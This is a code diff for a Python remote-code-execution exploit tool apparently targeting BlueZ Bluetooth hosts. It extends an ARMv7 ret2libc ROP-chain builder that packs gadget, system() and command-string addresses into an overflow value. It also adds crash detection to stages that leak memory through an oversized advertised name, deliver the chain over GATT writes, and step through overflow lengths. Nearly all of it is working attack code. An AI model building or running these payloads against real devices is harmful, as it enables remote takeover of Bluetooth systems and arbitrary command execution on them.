@@ -67,28 +67,50 @@ def arm_rop(
     system_thumb: bool | None = None,
     command_addr: int | None = None,
     return_addr: int | None = None,
+    shadow_base: int | None = None,
+    lr_gadget: int | None = None,
 ) -> bytes:
     # armv7 ret2libc chain; only the gadget and system carry the thumb bit
     if offset >= size:
         raise ValueError("offset must be smaller than the value size")
-    if gadget_words < 2:
+    if lr_gadget is not None and return_addr is None:
+        raise ValueError("lr gadget needs a return address")
+    if lr_gadget is None and gadget_words < 2:
         raise ValueError("gadget must pop r0 and pc")
     if system_thumb is None:
         system_thumb = thumb
     command_bytes = command.encode() + b"\x00"
     chain_at = offset
-    chain_len = 4 * (1 + gadget_words + (1 if return_addr is not None else 0))
-    command_at = command_addr if command_addr is not None else chain_at + chain_len
-    if command_addr is None and command_at + len(command_bytes) > size:
-        raise ValueError("command does not fit")
-    words = [pop_r0_pc | (1 if thumb else 0), command_at]
-    words.extend([gadget_filler] * (gadget_words - 2))
-    words.append(system | (1 if system_thumb else 0))
-    if return_addr is not None:
-        words.append(return_addr)
+    if lr_gadget is not None:
+        chain_len = 4 * 4
+    else:
+        chain_len = 4 * (1 + gadget_words + (1 if return_addr is not None else 0))
+    if command_addr is not None:
+        command_at = command_addr - (shadow_base or 0)
+        if shadow_base is not None and (
+            command_at < 0 or command_at + len(command_bytes) > size
+        ):
+            raise ValueError("command does not fit")
+    else:
+        command_at = chain_at + chain_len
+        if command_at + len(command_bytes) > size:
+            raise ValueError("command does not fit")
+    if lr_gadget is not None:
+        words = [
+            lr_gadget | (1 if thumb else 0),
+            command_addr if command_addr is not None else command_at,
+            system | (1 if system_thumb else 0),
+            return_addr | (1 if thumb else 0),
+        ]
+    else:
+        words = [pop_r0_pc | (1 if thumb else 0), command_at if command_addr is None else command_addr]
+        words.extend([gadget_filler] * (gadget_words - 2))
+        words.append(system | (1 if system_thumb else 0))
+        if return_addr is not None:
+            words.append(return_addr)
     value = bytearray(b"A" * size)
     value[chain_at : chain_at + chain_len] = struct.pack(f"<{len(words)}I", *words)
-    if command_addr is None:
+    if command_addr is None or shadow_base is not None:
         value[command_at : command_at + len(command_bytes)] = command_bytes
     return bytes(value)
 
@@ -160,6 +182,8 @@ class RCEConfig:
     system: int | None = None
     gadget: int | None = None
     command_addr: int | None = None
+    shadow: int | None = None
+    return_addr: int | None = None
     align_ret: int | None = None
     leak_length: int = 253
     scan_seconds: float = 20.0
@@ -169,6 +193,8 @@ class RCEConfig:
     write_mode: str = "auto"
     mtu: int = 517
     gadget_words: int = 2
+    gadget_lr: int | None = None
+    system_thumb: bool = False
     hello: bool = False
     ladder: bool = False
     ladder_lengths: str = "1,4,8,16,24,32,48,64,96,128,160,192,224,240,248,252,256,260,264,272,288,320,384,448,512"
@@ -315,6 +341,38 @@ class RCE:
         status = "ok" if "bluez" in fingerprint.get("tags", []) else "finding"
         return self.record(StageResult("fingerprint", status, summary, {"fingerprint": fingerprint}))
 
+    async def _runs(self) -> int | None:
+        status = getattr(self.transport, "status", None)
+        if status is None:
+            return None
+        try:
+            return (await status()).get("runs")
+        except Exception:
+            return None
+
+    async def _crash_wait(self, runs: int | None) -> int:
+        """Measure the outage after a write.
+
+        Silence alone misses a fast restart, so when the transport can report
+        the app's run counter (the supervisor), use it and fall back to the
+        advertisement tracker otherwise.  ``runs`` is sampled before the write.
+        """
+        if runs is None:
+            return await self.tracker.wait_silence(self.config.settle, self.config.recovery)
+        started = time.monotonic()
+        deadline = started + self.config.recovery
+        while time.monotonic() < deadline:
+            try:
+                current = (await self.transport.status()).get("runs")
+            except Exception:
+                current = runs
+            if current != runs:
+                return int((time.monotonic() - started) * 1000)
+            if time.monotonic() - started > self.config.settle:
+                return 0
+            await asyncio.sleep(0.1)
+        return -1
+
     async def leak(self) -> StageResult:
         # send the invalid name and measure silence; the marker stays in the gap
         length = self.config.leak_length
@@ -323,6 +381,7 @@ class RCE:
         marker = b"LEAK"[: length - 250]
         name = b"\xff" * (length - len(marker)) + marker
         payload = bytes([len(name) + 1, 0x09]) + name
+        runs = await self._runs()
         await self.transport.advertise(payload, extended=True)
         try:
             await asyncio.sleep(1.0)
@@ -334,7 +393,7 @@ class RCE:
         finally:
             await self.disconnect()
             await self.transport.stop_advertising()
-        downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
+        downtime = await self._crash_wait(runs)
         if downtime < 0:
             status, summary = "crash", "target did not advertise again"
         elif downtime:
@@ -356,6 +415,13 @@ class RCE:
         if cfg.system is None or cfg.gadget is None:
             return de_bruijn(cfg.size)
         if cfg.profile == "armv7":
+            command_addr = cfg.command_addr
+            if command_addr is None and cfg.shadow is not None:
+                if cfg.gadget_lr is not None:
+                    chain_len = 16
+                else:
+                    chain_len = 4 * (1 + cfg.gadget_words + (1 if cfg.return_addr is not None else 0))
+                command_addr = cfg.shadow + offset + chain_len
             return arm_rop(
                 cfg.system,
                 cfg.gadget,
@@ -363,7 +429,11 @@ class RCE:
                 offset,
                 cfg.size,
                 gadget_words=cfg.gadget_words,
-                command_addr=cfg.command_addr,
+                system_thumb=cfg.system_thumb,
+                command_addr=command_addr,
+                return_addr=cfg.return_addr,
+                shadow_base=cfg.shadow,
+                lr_gadget=cfg.gadget_lr,
             )
         if cfg.profile == "aarch64":
             return aarch64_rop(cfg.system, cfg.gadget, cfg.command, offset, cfg.size, command_addr=cfg.command_addr)
@@ -417,6 +487,7 @@ class RCE:
         }
         if self.config.dry_run:
             return self.record(StageResult("action", "ok", f"dry run, {len(value)} bytes", evidence))
+        runs = await self._runs()
         try:
             if self.config.mtu:
                 self.mtu = await self.transport.request_mtu(self.config.mtu)
@@ -427,7 +498,7 @@ class RCE:
             evidence["delivered"] = False
         finally:
             await self.disconnect()
-        downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
+        downtime = await self._crash_wait(runs)
         evidence["downtime_ms"] = downtime
         if downtime < 0:
             return self.record(StageResult("action", "crash", "target did not advertise again", evidence))
@@ -461,6 +532,7 @@ class RCE:
         for length in lengths:
             value = b"A" * min(length, MAX_ATT_VALUE)
             evidence: dict[str, Any] = {"handle": handle, "length": len(value), "write_mode": self.config.write_mode}
+            runs = await self._runs()
             try:
                 if self.config.mtu:
                     self.mtu = await self.transport.request_mtu(self.config.mtu)
@@ -470,7 +542,7 @@ class RCE:
                 evidence["error"] = str(error)
             finally:
                 await self.disconnect()
-            downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
+            downtime = await self._crash_wait(runs)
             evidence["downtime_ms"] = downtime
             if downtime != 0:
                 result = self.record(
